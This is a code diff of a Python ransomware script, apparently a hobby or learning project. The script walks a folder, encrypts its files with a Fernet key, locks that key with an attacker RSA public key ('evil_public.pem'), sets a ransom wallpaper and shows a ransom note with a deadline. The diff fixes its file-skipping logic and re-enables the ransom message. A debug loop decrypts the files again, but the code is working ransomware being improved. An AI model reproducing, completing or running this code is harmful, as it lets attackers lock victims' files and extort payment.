@@ -8,8 +8,8 @@ from datetime import datetime, timedelta
 
 
 directory_list = []
-forbidden_files = ["bitcoin_key.txt", "aes_key.txt", "public.pem", "final_ransom.jpg", "decrypt.py"]
-encrpyt_basePath = "C:\\Users\\IEUser\\Documents\\Ransom\\fuck\\" # change the path the way you like
+forbidden_files = ["bitcoin_note.txt", "aes_key.txt", "evil_public.pem", "final_ransom.jpg", "decrypt.py"]
+encrpyt_basePath = "C:\\Users\\IEUser\\Downloads\\Test\\" # change the path the way you like
 
 def generate_fernet():
     key = Fernet.generate_key()
@@ -20,7 +20,7 @@ def generate_fernet():
     return fernet
 
 def encrypt_keyfile():
-    encrypt_key = RSA.import_key(open("public.pem").read())
+    encrypt_key = RSA.import_key(open("evil_public.pem").read())
     cipher_rsa = PKCS1_OAEP.new(encrypt_key)
     with open("aes_key.txt", "rb") as file:
         content = file.read()
@@ -45,7 +45,7 @@ def decrypt_file(filename, fernet):
 
 def list_file_directory(path):
     for curDir, dirs, files in os.walk(path):
-        #print(f"curDir is {curDir}, dirs are {dirs}, files are {files}")
+        print(f"curDir is {curDir}, dirs are {dirs}, files are {files}") # For debugging
         for file in files:
             directory_list.append(os.path.join(curDir, file))
 
@@ -72,28 +72,35 @@ def timelimit():
 
 if __name__ == "__main__":
     current_path = os.path.dirname(os.path.realpath(__file__))
-    list_file_directory(encrpyt_basePath)
+    this_file = os.path.basename(__file__)
+    forbidden_files.append(this_file)
     fernet = generate_fernet()
     encrypt_keyfile()
-    for file in directory_list:
-        if file in forbidden_files:
+    list_file_directory(encrpyt_basePath)
+    
+    for directory in directory_list:
+        filename = directory.split("\\")[-1]
+        # Not to encrypt necessary files(not the best way tho)
+        if filename in forbidden_files:
             continue
         try:
-            # For debugging
-            print(file)
-            encrypt_file(file, fernet)
+            print(directory) # For debugging
+            encrypt_file(directory, fernet)
         except PermissionError:
             pass
+
     # For debugging
-    for file in directory_list:
-        if file in forbidden_files:
+    for directory in directory_list:
+        filename = directory.split("\\")[-1]
+        if filename in forbidden_files:
             continue
         try:
-            decrypt_file(file, fernet)
+            print(directory) # For debugging
+            decrypt_file(directory, fernet)
         except PermissionError:
             pass
     chagne_backgrond(current_path)
     deadline= timelimit()
     make_note(deadline)
     open_note(current_path)
-    #show_message(deadline)
+    show_message(deadline)
